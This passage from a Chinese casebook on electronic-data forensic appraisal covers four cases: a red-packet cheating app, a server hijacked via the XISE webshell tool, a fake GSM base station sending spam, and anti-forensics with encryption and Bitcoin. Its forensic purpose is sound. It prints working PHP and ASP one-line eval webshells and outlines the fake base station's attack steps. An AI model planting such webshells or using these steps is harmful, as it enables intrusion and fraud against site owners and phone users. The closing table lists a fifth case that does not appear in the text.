## 案例一：直播平台外挂程序功能鉴定

**案号**：网神洞鉴［2021］数鉴字第2号

### 案情背景

某地公安接到某直播平台公司报案，称发现一个直播平台账户利用多台手机设备，通过外挂程序在各个直播间轮流抢主播发的红包共计数万元，抢到的红包再集中打赏给某主播提现。

### 委托要求

1. "样本1"APP安装包（APK文件）
2. 样本APK的基本信息分析
3. "样本1"最新版本及部分功能鉴定

### 鉴定工具

- **硬件**：盘古石取证工作站
- **软件**：星源APP溯源分析平台、雷电模拟器3.117版、JEB Decompiler PRO 3.19版、Frida 14.2版、7-Zip 19.00版、HashMyFiles 2.36版

### 技术分析过程

#### 1. 文件提取

通过ADB命令提取检材手机内的APK文件：

```bash
adb shell dumpsys window | findstr mCurrentFocus  # 获取当前运行的包名
adb shell pm path com.lcm.tvRedPacket  # 查看APK位置
adb pull /data/app/com.lcm.tvRedPacket/base.apk ./  # 导出APK
```

包名为`com.lcm.tvRedPacket`，使用"360加固"进行了应用加固。

#### 2. 应用脱壳

使用Frida进行脱壳处理：

```bash
frida -Uf com.lcm.tvRedPacket --no-pause -l F:\dexDump.js
```

脱壳后生成3个DEX文件（1054336.dex、2941032.dex、111960.dex），重命名后使用JEB加载分析。

#### 3. 核心功能代码分析

当用户选择"KS"选项时，应用调用方法`d.d.a.f0.c.d.d()`，该方法包含KS抢红包功能的核心代码：

1. **切换直播间功能**：通过辅助功能方法传入参数，完成模拟手势滑动的动作
2. **自动抢红包功能**：不断获取某直播平台内部隐藏ID数据，用于判断直播间是否存在红包，同时获取"红包倒计时"的控件和参数，等待倒计时结束后完成点击"红包"动作

## 案例二：服务器被非法控制案

**案号**：盘石司鉴［2017］计鉴字第108号

### 案情背景

2017年3月16日，xxx网络有限公司报案称其负责托管的服务器（域名：xxx.xxx.gov.cn）被黑客非法控制。经初步调查发现，服务器被xx市IDC机房两台服务器非法控制。

### 委托要求

1. 提取恢复检材手机中的基本信息、社交网络记录
2. 提取检材U盘中的TXT文件
3. 对检材硬盘中XISE软件进行程序功能分析

### 检材情况

| 检材 | 内容 |
|------|------|
| 001号 | 一部手机（品牌：三星，型号SM-N，IMEI码：xxx，操作系统：Android 6.0.1） |
| 002号 | 一个U盘 |
| 003号 | 一块硬盘 |

### 鉴定过程

#### 手机取证（001号检材）

使用SafeMobile手机取证系统提取数据：

- **通讯录**：218条（已删除0条）
- **通话记录**：995条（已删除0条）
- **短信记录**：1271条（已删除485条）
- **QQ账号**："1246778xxx（IIITTT）"记录197条，"64393xxx（生命何物）"记录89,745条（已删除1,631条）
- **微信账号**："sfl9708xxx（生命何物）"记录447,509条
- **Skype账号**："live:1963383xxx（Sam temp）"记录1,790条

#### WebShell分析（003号检材）

**环境搭建**：
- 虚拟机：Windows 7 X64
- IP地址：192.168.16.223（虚拟机1）、192.168.16.224（虚拟机2）
- XAMPP 3.2 PHP环境
- 分析程序：XISE WBMS管理V13.0.exe

**数据库分析**：

数据库`jsc.mdb`中`jsc`表记录：
- 状态值为7：表示程序界面中某条记录可以成功连接（显示绿勾）
- 状态值为8：表示某条记录无法成功连接（显示红叉）
- 当成功获取WebShell后，`hc`表中会增加一条记录

**PHP一句话木马**：

```php
<?php @eval($_POST['xise']); ?>
```

其中"xise"为连接该木马所需的密码。

### 鉴定意见

1. **手机数据**：成功提取通讯录、通话记录、短信、QQ、微信、Skype等社交网络记录
2. **U盘文件**：成功提取183个TXT文件
3. **XISE WBMS管理V13.0.exe程序功能**：
   - 获取存在一句话木马网站的WebShell
   - 将网站记录存储在Access数据库`jsc`表中
   - 可查看网站服务器的文件目录和内容
   - 可对文件进行查看、删除、上传、编辑操作

### 评析

网站后门木马（WebShell）是黑客利用网站漏洞入侵后放置在WEB目录下的动态脚本文件。一句话木马的特点是短小精悍、功能强大、隐蔽性强。一句话木马示例：
- ASP：`＜%eval request("sb")%＞`
- PHP：`＜?php @eval($_POST['sb']);?＞`

## 案例三：伪基站发送广告案

**案号**：湖北三真司鉴所计鉴字［2018］J0175号

### 伪基站原理

#### 设备组成

| 组件 | 说明 |
|------|------|
| 仿真控制设备 | 搭建GNU Radio和OpenBTS平台，安装GSMS群发软件 |
| 发射主机 | SSRP主板、功率放大器、天线（USRP） |
| 测试设备 | 工程手机（诺基亚功能机或智能手机APP） |

#### 工作流程

**步骤一：监听与伪装**
1. 工程手机获取BCCH频率
2. 测量邻近小区的BCCH场强
3. 选定BCCH信号最弱的小区频率
4. 设置相同MCC和MNC
5. 发射伪装后的BCCH信号

**步骤二：吸入手机鉴权**
1. 伪基站要求手机鉴权
2. 待手机反馈后直接确认成功

**步骤三：发送短信**
1. 根据IMSI码判断是否已发送
2. 若未发送，则设置任意主叫号码，于SDCCH发送短信
3. 手机收到伪基站发送的任意内容、任意数量的短信

**步骤四：踢出手机**
1. 利用周期性位置更新踢出
2. 伪基站设置计时器T3212，通过BCCH广播
3. 用户逾时触发位置更新请求
4. 伪基站判断是否已发送短信，拒绝位置更新
5. 手机小区重选，接入正常基站

### 鉴定过程

#### 取证内容

伪基站系统采用基于Linux的Ubuntu操作系统，电子数据司法鉴定工作需要熟悉Linux系统及命令。

#### 关键文件

**1. 任务名称_id.txt**

存储路径：桌面/任务名称_id.txt

存储内容：IMSI码，是GSMS软件发送短信手机的映射。文件内容示例：

```
460001713767736
460007898452976
460020797024154
460022369498725
...
```

**2. OpenBTS.log**

存储路径：/var/log/OpenBTS.log

- 搜索关键字"4600"去重后得到IMSI数量
- 搜索关键字"addsms"得到短信内容

**3. MySQL数据库**

数据库配置：/var/usr/openbts/Conf/config.php

数据库名：gsms

表`gsms_business`字段：ID、NUM、NAME、TIME、COUNT（界面显示数量）、LASTTIME（实际发送数量）、CONTENT、STATUS

**4. TMSI.db**

存储路径：/etc/Openbts/

- 表`TMSI_TABLE`：记录受影响手机的TMSI
- 表`SMS_SENT`：记录短信发送次数

**5. Send.data**

存储路径：/var/usr/OpenBTS/send.data

由发送任务ID和发送目标IMSI组成。

### 鉴定意见

从被检测数据库中查明：

- 短信类型：121条
- 总发送量：2,258,486条
- 短信内容涉及："银行无抵押无担保信用贷款"、"急用钱找平安"等

### 案例回顾

伪基站的核心组件是发射主机及群发软件。发射主机主要由SSRP主板、功率放大器、天线组成，功率越大覆盖范围越广。大部分伪基站系统使用Ubuntu系统。鉴定人员应对Linux操作系统有一定了解，熟悉相关Linux命令。

## 案例五：反取证案例

**案号**：湖北三真司鉴所计鉴字［2016］第XX号

### 案情背景

2015年6月1日，某缉私局对走私毒品案立案侦查。经查，武汉某公司生产已列入国家管制精神药品目录的化学物，并通过邮寄渠道走私至美国、英国、加拿大等地销售牟利。

### 检材情况

- 台式机硬盘5块
- 移动硬盘3块
- 笔记本硬盘4块（其中1块为BitLocker全盘加密）
- 手机6台
- 邮箱6个
- 比特币和PayPal账号各1个
- U盘2个

### 反取证技术

#### 1. BitLocker

Windows Vista及之后系统的全磁盘加密功能，默认使用128位或256位AES加密算法。

**三种认证模式**：
- **透明运行模式**：使用TPM硬件提供透明体验
- **用户认证模式**：要求预引导PIN或密码认证
- **USB密钥模式**：需要USB设备包含启动密钥

#### 2. VeraCrypt

开源即时加密软件，是TrueCrypt项目的分支。功能与BitLocker类似。

#### 3. 比特币反取证特性

| 特性 | 说明 |
|------|------|
| **匿名性** | 比特币地址与自然人无对应关系，不记名特性实现匿名交易 |
| **无法冻结扣划** | 地址与公钥、私钥绑定，政府无法转出地址中的比特币 |
| **难追溯性** | 单笔交易可多对多进行，可加入无辜用户增加追溯难度 |
| **跨境流通便利** | 电子存储携带，可逃过各国海关 |

**公钥私钥生成流程**：
```
私钥(32字节) → 公钥 → SHA256 → RIPEMD160 → Base58编码 → 比特币地址
```

#### 4. U盘系统

**Windows To Go**：
- 从USB设备启动Windows 8企业版
- 与本地磁盘隔离，不修改本地数据
- 系统活动在内存中，带离电脑5秒内关闭防止信息泄露
- 可配合BitLocker使用

**Linux Kodachi**：
- 基于Debian的隐私保护操作系统
- 建立VPN + Tor + DNSCrypt运行环境
- 活动在临时内存RAM下，关机清除所有痕迹
- 强制所有连接通过VPN和Tor

#### 5. VPN

虚拟私人网络，通过加密隧道协议（Tunneling Protocol）实现保密、发送端认证、消息完整性保证。

### 取证过程

#### 比特币可行性分析

**比特币地址总量**：2^160个（天文数字），具有唯一性。

**wallet.dat文件**：
- 存储在安装比特币交易客户端的计算机磁盘上
- 包含公钥与私钥
- 恢复此文件可确定犯罪嫌疑人为比特币地址的控制者

#### 数据恢复

使用FinalData进行数据恢复：
1. 选择需要恢复的磁盘
2. wallet.dat默认路径：`C:\Documents and Settings\Administrator\Application Data\Bitcoin`
3. 完整恢复后导入比特币核心客户端查看账户信息

#### wallet.dat损坏处理

使用WinHex打开损坏文件，搜索关键字"receive"，可找到比特币地址：

```
接收地址示例：1JfbRFjdgSurVWV45kGcy1p2tfE6XpmBK
```

### 鉴定结论

案件涉及比特币：**174.671个**，比特币账户总资产：**395,036.8元**

### 评析

电子数据取证技术一直与反取证技术相抗衡。随着电子通信技术和计算机网络的普及，与电子证据有关的犯罪案件数量增加，反取证技术的发展对取证人员提出新的难题。

## 总结

电子数据司法鉴定涉及的案件类型多种多样，不同类型案件的鉴定方法与鉴定思路各不相同。本章通过5个实际鉴定案例介绍了：

| 案件类型 | 鉴定重点 |
|----------|----------|
| 外挂程序功能鉴定 | 逆向工程、代码分析、辅助功能调用链分析 |
| 服务器被非法控制 | WebShell分析、数据库取证、环境模拟 |
| 伪基站发送广告 | Linux系统取证、日志分析、数据库恢复 |
| 网络传销 | 网站还原、数据库分析、层级统计 |
| 反取证 | 加密破解、数据恢复、比特币取证 |
